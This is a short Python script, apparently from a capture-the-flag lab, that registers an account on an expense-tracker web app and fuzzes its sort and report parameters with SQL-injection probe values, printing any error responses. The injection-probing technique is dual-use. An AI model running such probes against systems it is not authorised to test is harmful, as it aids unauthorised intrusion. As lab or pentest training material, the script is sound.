import sys, re, requests, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
base = "http://xebec.cylabacademy.net:30787"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})
S.post(base + "/signup", data={"username": "uA", "email": "a@b.c", "password": "pA"}, timeout=15, verify=False)
S.post(base + "/login", data={"username": "uA", "password": "pA"}, timeout=15, verify=False)
S.post(base + "/expenses", data={"description": "x", "amount": "1", "date": "2024-01-01"}, timeout=15, verify=False)
params = ["sort", "order", "order_by", "orderby", "by", "column", "field", "dir", "direction", "type", "format", "tab"]
for p in params:
    for val in ("amount", "amount DESC", "1", "amount'", "amount, (SELECT 1)"):
        try:
            r = S.get(base + "/expenses", params={p: val}, timeout=10, verify=False)
            if r.status_code != 200:
                print(f"GET ?{p}={val!r} -> {r.status_code} {r.text[:100]!r}")
        except Exception:
            pass
        try:
            r = S.post(base + "/generate_report", data={p: val}, timeout=10, verify=False)
            if r.status_code != 200:
                print(f"POST report {p}={val!r} -> {r.status_code} {r.text[:100]!r}")
        except Exception:
            pass
print("fuzz termine")
# verifier le HTML de la page pour des indices
r = S.get(base + "/expenses", timeout=15, verify=False)
html = r.text or ""
for kw in ("sort", "order", "report"):
    idx = html.lower().find(kw)
    if idx >= 0:
        print(f"\n{kw}:", html[max(0, idx - 100):idx + 150].replace("\n", " ")[:250])
